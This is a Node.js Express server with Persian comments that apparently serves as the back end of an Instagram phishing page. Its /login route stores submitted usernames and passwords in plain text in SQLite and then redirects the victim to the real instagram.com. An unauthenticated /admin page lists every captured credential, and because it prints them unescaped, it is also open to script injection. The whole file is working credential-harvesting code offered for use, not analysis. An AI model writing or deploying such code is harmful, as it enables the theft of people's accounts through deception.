const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const bodyParser = require('body-parser');
const path = require('path');

const app = express();
const port = 3000;

// دیتابیس SQLite
const db = new sqlite3.Database('./users.db', (err) => {
  if(err) console.error(err);
  else console.log('SQLite connected');
});

// ساخت جدول اگر وجود نداشت
db.run(`CREATE TABLE IF NOT EXISTS users (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  username TEXT,
  password TEXT
)`);

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname))); // تا بتونه index.html رو لود کنه

// دریافت اطلاعات فرم و ذخیره در دیتابیس
app.post('/login', (req,res) => {
  const { username, password } = req.body;
  db.run(`INSERT INTO users (username,password) VALUES (?,?)`,
    [username, password],
    function(err){
      if(err){
        console.error(err);
        res.send('خطا در ثبت اطلاعات');
      } else {
        console.log(`کاربر ذخیره شد: ${username}`);
        res.redirect('https://www.instagram.com');
      }
    });
});

// نمایش لیست کاربران
app.get('/admin', (req, res) => {
  db.all("SELECT id, username, password FROM users", [], (err, rows) => {
    if(err) return res.send("خطا در خواندن دیتابیس");

    let html = "<h1>لیست کاربران</h1><table border='1'><tr><th>ID</th><th>Username</th><th>Password</th></tr>";
    rows.forEach(row => {
      html += `<tr><td>${row.id}</td><td>${row.username}</td><td>${row.password}</td></tr>`;
    });
    html += "</table>";
    res.send(html);
  });
});

app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
});
